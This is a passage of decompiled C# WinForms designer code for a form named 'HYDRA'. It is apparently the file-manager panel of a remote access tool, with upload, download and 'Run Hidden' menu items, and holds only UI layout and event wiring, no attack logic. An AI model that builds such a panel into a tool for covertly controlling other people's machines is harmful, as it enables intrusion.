			this.lvFileManagement.ForeColor = System.Drawing.Color.White;
			this.lvFileManagement.HideSelection = false;
			this.lvFileManagement.Location = new System.Drawing.Point(183, 99);
			this.lvFileManagement.Name = "lvFileManagement";
			this.lvFileManagement.Size = new System.Drawing.Size(797, 424);
			this.lvFileManagement.SmallImageList = this.imageList2;
			this.lvFileManagement.TabIndex = 100;
			this.lvFileManagement.UseCompatibleStateImageBehavior = false;
			this.lvFileManagement.View = System.Windows.Forms.View.Details;
			this.lvFileManagement.AfterLabelEdit += new System.Windows.Forms.LabelEditEventHandler(lvFileManagement_LabelEdit);
			this.lvFileManagement.DrawColumnHeader += new System.Windows.Forms.DrawListViewColumnHeaderEventHandler(lvFileManagement_DrawColumnHeader);
			this.lvFileManagement.DrawItem += new System.Windows.Forms.DrawListViewItemEventHandler(lvFileManagement_DrawItem);
			this.lvFileManagement.DrawSubItem += new System.Windows.Forms.DrawListViewSubItemEventHandler(lvFileManagement_DrawSubItem);
			this.lvFileManagement.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(lvFileManagement_MouseDoubleClick);
			this.colFName.Text = "Name";
			this.colFName.Width = 295;
			this.colFType.Text = "Size";
			this.colFType.Width = 282;
			this.colFSize.Text = "Type";
			this.colFSize.Width = 218;
			this.contextMenuStrip2.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.contextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[11]
			{
				this.refreshToolStripMenuItem, this.copyToolStripMenuItem, this.pasteToolStripMenuItem, this.renameFileToolStripMenuItem, this.renameFolderToolStripMenuItem, this.newFolderToolStripMenuItem, this.deleteToolStripMenuItem, this.downloadToolStripMenuItem, this.uploadToolStripMenuItem, this.rarToolStripMenuItem,
				this.runToolStripMenuItem
			});
			this.contextMenuStrip2.Name = "contextMenuStrip2";
			this.contextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.White;
			this.contextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
			this.contextMenuStrip2.RenderStyle.ColorTable = null;
			this.contextMenuStrip2.RenderStyle.RoundedEdges = true;
			this.contextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
			this.contextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.contextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.Black;
			this.contextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
			this.contextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			this.contextMenuStrip2.Size = new System.Drawing.Size(154, 246);
			this.refreshToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.refreshToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.refreshToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("refreshToolStripMenuItem.Image");
			this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
			this.refreshToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
			this.refreshToolStripMenuItem.Text = "Refresh";
			this.refreshToolStripMenuItem.Click += new System.EventHandler(刷新ToolStripMenuItem_Click);
			this.copyToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.copyToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.copyToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("copyToolStripMenuItem.Image");
			this.copyToolStripMenuItem.Name = "copyToolStripMenuItem";
			this.copyToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
			this.copyToolStripMenuItem.Text = "Copy";
			this.copyToolStripMenuItem.Click += new System.EventHandler(copyToolStripMenuItem_Click);
			this.pasteToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.pasteToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.pasteToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("pasteToolStripMenuItem.Image");
			this.pasteToolStripMenuItem.Name = "pasteToolStripMenuItem";
			this.pasteToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
			this.pasteToolStripMenuItem.Text = "Paste";
			this.pasteToolStripMenuItem.Click += new System.EventHandler(pasteToolStripMenuItem_Click);
			this.renameFileToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.renameFileToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.renameFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("renameFileToolStripMenuItem.Image");
			this.renameFileToolStripMenuItem.Name = "renameFileToolStripMenuItem";
			this.renameFileToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
			this.renameFileToolStripMenuItem.Text = "Rename File";
			this.renameFileToolStripMenuItem.Visible = false;
			this.renameFileToolStripMenuItem.Click += new System.EventHandler(renameToolStripMenuItem_Click);
			this.renameFolderToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.renameFolderToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.renameFolderToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("renameFolderToolStripMenuItem.Image");
			this.renameFolderToolStripMenuItem.Name = "renameFolderToolStripMenuItem";
			this.renameFolderToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
			this.renameFolderToolStripMenuItem.Text = "Rename Folder";
			this.renameFolderToolStripMenuItem.Click += new System.EventHandler(renameDirectToolStripMenuItem_Click);
			this.newFolderToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.newFolderToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.newFolderToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("newFolderToolStripMenuItem.Image");
			this.newFolderToolStripMenuItem.Name = "newFolderToolStripMenuItem";
			this.newFolderToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
			this.newFolderToolStripMenuItem.Text = "New Folder";
			this.newFolderToolStripMenuItem.Visible = false;
			this.newFolderToolStripMenuItem.Click += new System.EventHandler(newFrolderToolStripMenuItem_Click);
			this.deleteToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.deleteToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.deleteToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("deleteToolStripMenuItem.Image");
			this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
			this.deleteToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
			this.deleteToolStripMenuItem.Text = "Delete";
			this.deleteToolStripMenuItem.Click += new System.EventHandler(deleteToolStripMenuItem_Click);
			this.downloadToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.downloadToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.downloadToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("downloadToolStripMenuItem.Image");
			this.downloadToolStripMenuItem.Name = "downloadToolStripMenuItem";
			this.downloadToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
			this.downloadToolStripMenuItem.Text = "Download";
			this.downloadToolStripMenuItem.Click += new System.EventHandler(downloadToolStripMenuItem_Click);
			this.uploadToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.uploadToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.uploadToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("uploadToolStripMenuItem.Image");
			this.uploadToolStripMenuItem.Name = "uploadToolStripMenuItem";
			this.uploadToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
			this.uploadToolStripMenuItem.Text = "Upload";
			this.uploadToolStripMenuItem.Click += new System.EventHandler(uploadToolStripMenuItem_Click);
			this.rarToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.rarToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.rarToolStripMenuItem1, this.unRarToolStripMenuItem });
			this.rarToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.rarToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("rarToolStripMenuItem.Image");
			this.rarToolStripMenuItem.Name = "rarToolStripMenuItem";
			this.rarToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
			this.rarToolStripMenuItem.Text = "Rar";
			this.rarToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.rarToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			this.rarToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("rarToolStripMenuItem1.Image");
			this.rarToolStripMenuItem1.Name = "rarToolStripMenuItem1";
			this.rarToolStripMenuItem1.Size = new System.Drawing.Size(106, 22);
			this.rarToolStripMenuItem1.Text = "Rar";
			this.rarToolStripMenuItem1.Click += new System.EventHandler(rARToolStripMenuItem_Click);
			this.unRarToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.unRarToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.unRarToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("unRarToolStripMenuItem.Image");
			this.unRarToolStripMenuItem.Name = "unRarToolStripMenuItem";
			this.unRarToolStripMenuItem.Size = new System.Drawing.Size(106, 22);
			this.unRarToolStripMenuItem.Text = "UnRar";
			this.unRarToolStripMenuItem.Click += new System.EventHandler(unrarToolStripMenuItem_Click);
			this.runToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.runToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.runVisibleToolStripMenuItem, this.runHiddenToolStripMenuItem });
			this.runToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.runToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("runToolStripMenuItem.Image");
			this.runToolStripMenuItem.Name = "runToolStripMenuItem";
			this.runToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
			this.runToolStripMenuItem.Text = "Run";
			this.runVisibleToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.runVisibleToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.runVisibleToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("runVisibleToolStripMenuItem.Image");
			this.runVisibleToolStripMenuItem.Name = "runVisibleToolStripMenuItem";
			this.runVisibleToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
			this.runVisibleToolStripMenuItem.Text = "Run Visible";
			this.runVisibleToolStripMenuItem.Click += new System.EventHandler(displayRunToolStripMenuItem_Click);
			this.runHiddenToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.runHiddenToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.runHiddenToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("runHiddenToolStripMenuItem.Image");
			this.runHiddenToolStripMenuItem.Name = "runHiddenToolStripMenuItem";
			this.runHiddenToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
			this.runHiddenToolStripMenuItem.Text = "Run Hidden";
			this.runHiddenToolStripMenuItem.Click += new System.EventHandler(hiddenRunToolStripMenuItem_Click);
			this.imageList2.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList2.ImageStream");
			this.imageList2.TransparentColor = System.Drawing.Color.Transparent;
			this.imageList2.Images.SetKeyName(0, "doc_50px.png");
			this.imageList2.Images.SetKeyName(1, "exe_50px.png");
			this.imageList2.Images.SetKeyName(2, "txt_50px.png");
			this.imageList2.Images.SetKeyName(3, "zip_50px.png");
			this.imageList2.Images.SetKeyName(4, "7zip_30px.png");
			this.imageList2.Images.SetKeyName(5, "audio_file_30px.png");
			this.imageList2.Images.SetKeyName(6, "binary_file_30px.png");
			this.imageList2.Images.SetKeyName(7, "cs_30px.png");
			this.imageList2.Images.SetKeyName(8, "css_filetype_30px.png");
			this.imageList2.Images.SetKeyName(9, "csv_30px.png");
			this.imageList2.Images.SetKeyName(10, "dmg_30px.png");
			this.imageList2.Images.SetKeyName(11, "document_30px.png");
			this.imageList2.Images.SetKeyName(12, "exe.png");
			this.imageList2.Images.SetKeyName(13, "folder.png");
			this.imageList2.Images.SetKeyName(14, "heic_filetype_30px.png");
			this.imageList2.Images.SetKeyName(15, "hexadecimal_30px.png");
			this.imageList2.Images.SetKeyName(16, "html_filetype_30px.png");
			this.imageList2.Images.SetKeyName(17, "image_file_30px.png");
			this.imageList2.Images.SetKeyName(18, "java_file_30px.png");
			this.imageList2.Images.SetKeyName(19, "kmz_30px.png");
			this.imageList2.Images.SetKeyName(20, "png_30px.png");
			this.imageList2.Images.SetKeyName(21, "ps_30px.png");
			this.imageList2.Images.SetKeyName(22, "psd_30px.png");
			this.imageList2.Images.SetKeyName(23, "rar_30px.png");
			this.imageList2.Images.SetKeyName(24, "UnknownExe.png");
			this.imageList2.Images.SetKeyName(25, "zip_30px.png");
			this.imageList2.Images.SetKeyName(26, "7zip_30px.png");
			this.label1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.label1.AutoSize = true;
			this.label1.ForeColor = System.Drawing.Color.White;
			this.label1.Location = new System.Drawing.Point(923, 526);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(35, 13);
			this.label1.TabIndex = 101;
			this.label1.Text = "File[0]";
			this.label3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.label3.AutoSize = true;
			this.label3.ForeColor = System.Drawing.Color.White;
			this.label3.Location = new System.Drawing.Point(12, 526);
			this.label3.Name = "label3";
			this.label3.Size = new System.Drawing.Size(40, 13);
			this.label3.TabIndex = 102;
			this.label3.Text = "Status:";
			this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
			this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
			this.imageList1.Images.SetKeyName(0, "folder.png");
			this.imageList1.Images.SetKeyName(1, "filemanager.png");
			this.txtSearchName.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.txtSearchName.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.txtSearchName.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
			this.txtSearchName.ForeColor = System.Drawing.Color.White;
			this.txtSearchName.Location = new System.Drawing.Point(181, 73);
			this.txtSearchName.Name = "txtSearchName";
			this.txtSearchName.Size = new System.Drawing.Size(739, 20);
			this.txtSearchName.TabIndex = 103;
			this.picBackFolder.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.picBackFolder.Image = (System.Drawing.Image)resources.GetObject("picBackFolder.Image");
			this.picBackFolder.Location = new System.Drawing.Point(926, 73);
			this.picBackFolder.Name = "picBackFolder";
			this.picBackFolder.Size = new System.Drawing.Size(23, 20);
			this.picBackFolder.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.picBackFolder.TabIndex = 104;
			this.picBackFolder.TabStop = false;
			this.picBackFolder.Click += new System.EventHandler(picBackFolder_Click);
			this.picForwardFolder.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.picForwardFolder.Image = (System.Drawing.Image)resources.GetObject("picForwardFolder.Image");
			this.picForwardFolder.Location = new System.Drawing.Point(955, 73);
			this.picForwardFolder.Name = "picForwardFolder";
			this.picForwardFolder.Size = new System.Drawing.Size(23, 20);
			this.picForwardFolder.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.picForwardFolder.TabIndex = 105;
			this.picForwardFolder.TabStop = false;
			this.picForwardFolder.Click += new System.EventHandler(picForwardFolder_Click);
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			this.CloseBtn.AllowAnimations = true;
			this.CloseBtn.AllowBorderColorChanges = true;
			this.CloseBtn.AllowMouseEffects = true;
			this.CloseBtn.AnimationSpeed = 200;
			this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.CloseBtn.BorderRadius = 1;
			this.CloseBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.CloseBtn.BorderThickness = 1;
			this.CloseBtn.ColorContrastOnClick = 30;
			this.CloseBtn.ColorContrastOnHover = 30;
			this.CloseBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.CloseBtn.CustomizableEdges = borderEdges;
			this.CloseBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.CloseBtn.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.Image");
			this.CloseBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.CloseBtn.Location = new System.Drawing.Point(12, 12);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.RoundBorders = false;
			this.CloseBtn.ShowBorders = true;
			this.CloseBtn.Size = new System.Drawing.Size(35, 35);
			this.CloseBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.CloseBtn.TabIndex = 169;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(992, 548);
			base.Controls.Add(this.CloseBtn);
			base.Controls.Add(this.picForwardFolder);
			base.Controls.Add(this.picBackFolder);
			base.Controls.Add(this.txtSearchName);
			base.Controls.Add(this.label3);
			base.Controls.Add(this.label1);
			base.Controls.Add(this.lvFileManagement);
			base.Controls.Add(this.lvMainTree);
			base.Controls.Add(this.bunifuSeparator2);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.label1hydra);
			base.Controls.Add(this.guna2ControlBox1);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "HYDRA";
			this.Text = "HYDRA";
			base.Load += new System.EventHandler(HYDRA_Load);
			this.contextMenuStrip2.ResumeLayout(false);
			((System.ComponentModel.ISupportInitialize)this.picBackFolder).EndInit();
			((System.ComponentModel.ISupportInitialize)this.picForwardFolder).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
